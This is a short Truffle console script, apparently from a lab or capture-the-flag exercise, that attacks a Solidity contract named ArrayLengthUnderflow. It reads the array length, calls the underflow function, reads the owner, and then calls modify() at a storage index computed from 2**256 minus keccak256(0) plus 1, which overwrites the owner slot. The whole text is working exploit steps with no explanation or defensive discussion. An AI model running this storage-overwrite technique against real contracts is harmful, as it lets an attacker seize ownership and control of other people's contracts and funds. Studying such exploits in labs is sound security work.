// get array length
ArrayLengthUnderflow.deployed().then(function(instance){return instance.getLength.call();}).then(function(length){return length.toNumber();});

// get hash
ArrayLengthUnderflow.deployed().then(function(instance){return instance.getHash.call(0);}).then(function(value){return value;});

// underflow
ArrayLengthUnderflow.deployed().then(function(instance){return instance.underflow();});

// get owner
ArrayLengthUnderflow.deployed().then(function(instance){return instance.owner()});

// modify
ArrayLengthUnderflow.deployed().then(function(instance){return instance.modify('0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e', '0xabc')});

// array length - sha3(0x00) + owner's slot number
hex(2**256 - 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 + 1)
0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 - keccak256(uint(0))